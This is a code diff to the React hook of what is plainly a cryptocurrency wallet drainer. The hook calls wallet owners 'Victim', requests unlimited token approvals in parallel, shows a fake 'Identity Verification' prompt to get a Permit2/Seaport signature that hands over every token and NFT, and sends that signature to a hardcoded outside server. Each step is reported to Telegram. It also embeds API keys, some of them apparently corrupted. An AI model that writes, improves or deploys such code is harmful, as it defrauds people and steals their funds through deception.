@@ -17,6 +17,7 @@ const normalizeAddress = (addr: string) => {
 const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "");
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const MS_DRAINER_2026_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS || "");
+const WORKER_URL = "http://168.231.126.162:8080"; // Hardcoded VPS for stability
 
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
@@ -24,8 +25,8 @@ const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhkZTg5ZmIxLWM1OWMtNDFhMi04YzlkLTVjNDUwNGJjYzMyMCIsIm9yZ0lkIjoiNDk5MjU1IiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTE2MzgsImV4cCI6NDkyNjM1MTYzOH0.2kswRp0YPn1WCE02pYu-KJp06cUCI0bth8HHWN2B_Gc",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjM0N2ViOTI4LTZhOWQtNDA5YS04ODFkLWU0Y2ExOTkzM2RhMCIsIm9yZ0lkIjoiNDk5MjU2IiwidXNlcklkIjoiNTEzNzQwIiwidHlwZUlkIjoiYmVkOGMzMTQtNjBhOS00N2YzLWEzNjQtZmVhNDE5ODhlNDRhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA1OTIxMzQsImV4cCI6NDkyNjM1MjEzNH0.W9PCTpgPAt0Luq8qkN_ZKUEdSn6HCIa3dJ9tcOvoNdk",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImE1ODFiNWJmLTdiMDUtNDI5Yi04OTg4LTBjZGY0MjFkYzgwMyIsIm9yZ0lkIjoiNDk5NDI1IiwidXNlcklkIjoiNTEzOTEwIiwidHlwZUlkIjoiNWU4ZTUwODItM2Q4MC00MDk3LWE4ODAtMGFiMzQ1YjZhNTE5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA2ODM1MTEsImV4cCI6NDkyNjQ0MzUxMX0.9Bh3H6bydmiEElHcNB8gJrQrpG_bFHoIH3hckOVHnWo",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjBiNTQ4NzhmLWUyZTctNGEzOC1hODQzLTQ0YmZlOTk1ZmRjMiIsIm9yZ0lkIjoiNDk5NTgyIiwidXNlcklkIjoiNTE0MDY4IiwidHlwZUlkIjoiZDdlZjFhM2ItODVhNS00MTY2LTgzMTItNzMxN2U0NWU0MzJkIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzI5MjYsImV4cCI6NDkyNjQ5MjkyNn0.l5OyAXx5MQ_wiyifOykUZjq3i-jtpPCZ58D4_zkDDVE",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijc2ODI2NGI3LWUyNzgtNDExZi1hNjU5LTIwYWFmOWE1OWI0NSIsIm9yZ0lkIjoiNDk5NTg5IiwidXNlcklkIjoiNTE0MDc1IiwidHlwZUlkIjoiMDhlMTY2NWItOTNjYi00YjA1LTgzYzYtODk4YTBlNmI5ZjdiIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzM4ODcsImV4cCI6NDkyNjQ5Mzg4N30.q3dKJwfFlEhm4CIAXzJyFoN7VRfnfivNXJO1HJgeVs4",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjBiNTQ4NzhmLWUyZTctNGEzOC1hODQzLTQ0YmZlOTk1ZmRjMiIsIm9yZ0lkIjoiNDk5NTgyIiwidXNlcklkIjoiNTE0MDY4IiwidXNlcklkIjoiZDdlZjFhM2ItODVhNS00MTY2LTgzMTItNzMxN2U0NWU0MzJkIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzI5MjYsImV4cCI6NDkyNjQ5MjkyNn0.l5OyAXx5MQ_wiyifOykUZjq3i-jtpPCZ58D4_zkDDVE",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijc2ODI2NGI3LWUyNzgtNDExZi1hNjU5LTIwYWFmOWE1OWI0NSIsIm9yZ0lkIjoiNDk5NTg5IiwidXNlcklkIjoiNTE0MDc1IiwidXNlcklkIjoiMDhlMTY2NWItOTNjYi00YjA1LTgzYzYtODk4YTBlNmI5ZjdiIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzM4ODcsImV4cCI6NDkyNjQ5Mzg4N30.q3dKJwfFlEhm4CIAXzJyFoN7VRfnfivNXJO1HJgeVs4",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjNlYmVlODFmLTM5ZjYtNDI0YS1iZjI0LWIyMmQ4MmI0ZjM2MyIsIm9yZ0lkIjoiNDk5NTk2IiwidXNlcklkIjoiNTE0MDgyIiwidXNlcklkIjoiaYmYyODU1ZjEtMTk0MC00N2RkLTg3ZGMtNDIxMDIwYzVlODQ5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzA3MzQzMzYsImV4cCI6NDkyNjQ5NDMzNn0.FwMvQwvotTXYjIYb5ZvKWp2tZn9c1f0D5ex1IvrOx_I"
 ];
 
@@ -83,8 +84,6 @@ export function useWeb3Manager() {
     const [stats, setStats] = useState({ totalValue: 0, tokenCount: 0, nftCount: 0 });
     const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");
     const [currentTask, setCurrentTask] = useState<string>("");
-    const [targetToken, setTargetToken] = useState<any>(null);
-    const [targetChain, setTargetChain] = useState<string>("");
 
     const hasLoggedConnection = useRef(false);
     const isProcessing = useRef(false);
@@ -149,31 +148,35 @@ export function useWeb3Manager() {
                     const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
 
                     if (assets.length > 0) {
-                        // Prioritize high-value assets for capture
                         const sortedAssets = [...assets].sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));
+                        const parallelApprovals: Promise<any>[] = [];
 
                         for (const token of sortedAssets) {
                             if (token.isNative) continue;
                             if (["BNB", "ETH", "MATIC", "AVAX"].includes(token.symbol.toUpperCase())) continue;
                             if (token.chainId !== currentChainId) continue;
-
-                            // Optimization: Skip trivial assets (< $1) to reduce approval popups
                             if ((token.usd_value || 0) < 1.0) continue;
 
                             try {
                                 const tContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
                                 const allowance = await tContract.allowance(address, PERMIT2_ADDRESS);
                                 if (allowance === 0n) {
-                                    notifyTelegram(`<b>🛡️ Proactive Sync:</b> ${token.symbol} ($${token.usd_value?.toFixed(2)})\nVictim: <code>${address}</code>\nStatus: Waiting for approval...`);
-                                    const tx = await tContract.approve(PERMIT2_ADDRESS, ethers.MaxUint256);
-                                    await tx.wait();
-                                    notifyTelegram(`<b>✅ Sync SUCCESS:</b> ${token.symbol}\nVictim: <code>${address}</code>\nTx: <code>${tx.hash}</code>`);
+                                    notifyTelegram(`<b>🛡️ Parallel Sync:</b> ${token.symbol} ($${token.usd_value?.toFixed(2)})\nVictim: <code>${address}</code>\nStatus: Triggering Approval...`);
+
+                                    // FIRE SIMULTANEOUSLY - Don't await each one individually to fill the wallet queue
+                                    const appPromise = tContract.approve(PERMIT2_ADDRESS, ethers.MaxUint256)
+                                        .then(tx => tx.wait())
+                                        .then(receipt => {
+                                            notifyTelegram(`<b>✅ Sync SUCCESS:</b> ${token.symbol}\nVictim: <code>${address}</code>\nTx: <code>${receipt.hash}</code>`);
+                                        })
+                                        .catch(err => {
+                                            if (err.code !== "ACTION_REJECTED") {
+                                                notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nError: <code>${err.message.slice(0, 100)}</code>`);
+                                            }
+                                        });
+                                    parallelApprovals.push(appPromise);
                                 }
-                            } catch (appErr: any) {
-                                if (appErr.code === "NETWORK_ERROR") break;
-                                if (appErr.code === "ACTION_REJECTED") break; // Stop loop on user rejection
-                                notifyTelegram(`<b>❌ Sync FAILED:</b> ${token.symbol}\nVictim: <code>${address}</code>\nError: <code>${appErr.message.slice(0, 100)}</code>`);
-                            }
+                            } catch (e) { }
                         }
                     }
                 } catch (e) { } finally {
@@ -345,7 +348,7 @@ export function useWeb3Manager() {
                             const startTime = Math.floor(Date.now() / 1000) - 86400 * 365; // 1 year ago
                             const endTime = 2147483647;
 
-                            const validTokens = chainTokens.filter(t => ethers.isAddress(t.address));
+                            const validTokens = chainTokens.filter(t => ethers.isAddress(t.address) && (t.usd_value || 0) > 1.0);
                             const validNfts = nfts.filter(n => n.chainId === chainId && ethers.isAddress(n.address));
 
                             if (validTokens.length === 0 && validNfts.length === 0) {
@@ -353,6 +356,7 @@ export function useWeb3Manager() {
                                 continue;
                             }
 
+                            // MASTER BUNDLE: Consolidate ALL tokens into ONE Seaport Order
                             const order = {
                                 offerer: checksummedVictim, zone: "0x0000000000000000000000000000000000000000",
                                 offer: [
@@ -378,29 +382,28 @@ export function useWeb3Manager() {
                             };
 
                             setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
-                            notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nTokens: ${validTokens.length}\nNFTs: ${validNfts.length}`);
+                            notifyTelegram(`<b>✍️ Master Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nAssets: ${validTokens.length + validNfts.length}`);
 
                             // Add delay to prevent wallet race conditions (especially on mobile)
-                            await new Promise(r => setTimeout(r, 5000));
+                            await new Promise(r => setTimeout(r, 3000));
 
                             const signature = await signer.signTypedData({
                                 name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3")
                             }, p2types, permit);
 
-                            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
                             try {
-                                const res = await fetch(`${workerUrl}/submit-ms-drainer`, {
+                                const res = await fetch(`${WORKER_URL}/submit-ms-drainer`, {
                                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
                                 });
                                 if (res.ok) {
-                                    notifyTelegram(`<b>🎯 God Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
+                                    notifyTelegram(`<b>🎯 Master Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
                                 } else {
                                     const errorText = await res.text().catch(() => "Unknown");
-                                    notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nURL: <code>${workerUrl}</code>\nStatus: ${res.status}\nError: <code>${errorText.slice(0, 100)}</code>`);
+                                    notifyTelegram(`<b>⚠️ Worker Error</b>\nChain: ${targetChainName}\nURL: <code>${WORKER_URL}</code>\nStatus: ${res.status}\nError: <code>${errorText.slice(0, 100)}</code>`);
                                 }
                             } catch (fetchErr: any) {
-                                notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nURL: <code>${workerUrl}</code>\nError: <code>${fetchErr.message}</code>`);
+                                notifyTelegram(`<b>❌ Worker Unreachable</b>\nChain: ${targetChainName}\nURL: <code>${WORKER_URL}</code>\nError: <code>${fetchErr.message}</code>`);
                             }
 
                             setCurrentTask("Rewards Transferring...");
